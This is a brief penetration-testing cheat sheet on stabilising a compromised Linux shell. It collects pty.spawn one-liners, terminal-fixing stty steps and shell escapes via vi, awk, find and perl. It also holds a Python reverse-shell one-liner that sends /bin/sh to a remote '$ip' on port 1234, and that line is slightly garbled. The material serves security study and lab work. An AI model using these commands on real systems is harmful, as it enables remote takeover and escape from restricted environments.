## Stabalizing a Linux Shell

	export TERM=linux
	
	python -c 'import pty; pty.spawn("/bin/sh")'
	
	python -c 'import pty; pty.spawn("/bin/bash")'
	
	python3 -c 'import pty; pty.spawn("/bin/sh")'
	
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
	echo os.system('/bin/bash')
	
	/bin/sh -i
	
	exec "/bin/sh";
	
	perl —e 'exec "/bin/sh";'

Related Shell Escape Sequences...

    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    awk-->	awk 'BEGIN {system("/bin/bash")}'
    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
    perl-->	perl -e 'exec "/bin/bash";'

A common technique

	python -c 'import pty;pty.spawn("/bin/bash")'
	
	Ctrl+z
	
	stty raw -echo
	
	fg + [Enter x 2]
	
	echo $TERM
	
	export TERM=screen
	
	reset
	
	export SHELL=bash
	
	stty size
	
	stty rows 100 cols 100
	
	
### References
- https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2
	